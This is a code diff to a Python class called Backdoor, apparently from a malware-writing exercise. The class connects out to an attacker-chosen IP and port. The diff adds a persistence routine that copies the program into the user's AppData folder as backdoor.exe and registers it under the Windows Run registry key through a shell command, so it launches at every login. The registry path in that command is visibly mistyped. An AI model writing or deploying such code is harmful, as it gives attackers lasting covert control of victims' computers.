@@ -13,7 +13,7 @@ class Backdoor:
 	def __init__(self, ip, port):
 		self.ip = ip
 		self.port = port
-
+		self.become_persistent()
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connection.connect((self.ip, self.port))
 
@@ -22,6 +22,12 @@ class Backdoor:
 		json_data = json.dumps(data)
 		self.connection.send(json_data)
 
+
+	def become_persistent(self):
+		evil_file_location = os.environ["appdata"] + "\\backdoor.exe"
+		if not os.path.exists(evil_file_location):
+			shutil.copyfile(sys.executable,evil_file_location)
+			subprocess.call('reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + evil_file_location +'"',shell=True)	
 	
 	def reliable_receive(self):
 		json_data = ''
